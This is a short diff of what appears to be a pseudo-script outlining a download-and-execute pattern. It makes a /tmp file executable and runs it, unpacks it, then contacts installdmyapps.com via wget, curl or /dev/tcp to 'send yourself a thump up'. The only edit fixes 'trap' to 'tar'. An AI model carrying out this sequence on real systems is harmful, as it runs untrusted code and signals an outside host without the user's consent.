@@ -23,7 +23,7 @@ chmod +x /tmp/nice_temporary.name
 /tmp/nice_temporary.name
 
 # - unpack
-trap|unzip|gz|bz /tmp/nice_temporary.name
+tar|unzip|gz|bz /tmp/nice_temporary.name
 
 # - send yourself a thump up
 wget|curl|devtcp http://installdmyapps.com
